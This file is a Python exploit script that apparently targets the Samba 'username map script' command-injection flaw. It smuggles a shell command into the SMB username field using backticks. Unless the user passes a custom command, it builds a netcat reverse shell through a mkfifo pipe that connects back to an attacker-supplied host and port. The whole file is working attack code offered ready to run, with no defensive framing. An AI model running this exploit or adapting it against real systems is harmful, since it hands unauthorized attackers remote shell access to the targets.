#!/usr/bin/env python3

import argparse
import sys
from smb.SMBConnection import SMBConnection
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
from smb.base import SMBTimeout

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--rhost", type=str, dest="rhost", metavar="<IP>", help="The hostname/IP of the target.", required=True)
    parser.add_argument("--rport", type=int, dest="rport", metavar="<PORT>", help="The SMB port of the target (default = 445).", required=False, default=445)
    parser.add_argument("--lhost", type=str, dest="lhost", metavar="<IP>", help="The hostname/IP of the attack box.", required=False)
    parser.add_argument("--lport", type=str, dest="lport", metavar="<PORT>", help="The listening port of the attack box (default = 443).", required=False, default="443")
    parser.add_argument("-c", type=str, dest="cmd", metavar="<COMMAND>", help="The custom command to execute.", required=False)
    parser.add_argument("-t", type=int, dest="timeout", metavar="<SECONDS>", help="The timeout in seconds for the connection attempt (default = 3).", required=False, default=3)
    args = parser.parse_args()

    rhost = args.rhost
    rport = args.rport

    if args.cmd:
        cmd = args.cmd
    elif args.lhost and args.lport:
        cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.lhost} {args.lport} >/tmp/f"
    else:
        print("Either --lhost or -c is required to proceed!", file=sys.stderr)
        exit(1)

    username = f"/=`nohup {cmd} `"
    password = ""

    with SMBConnection(username, password, "ByUs", "FuckYou", use_ntlm_v2=False) as conn:
        print("Connecting...\n")
        try:
            assert conn.connect(rhost, rport, timeout=args.timeout)
        except SMBTimeout:
            print(f"Executed command: {cmd}\n")
            print("Exiting...\n")
            sys.exit(0)
        except Exception as e:
            print("Error! Check your rhost and rport!\n", file=sys.stderr)
            print(e)
            sys.exit(1)

if __name__ == "__main__":
    main()
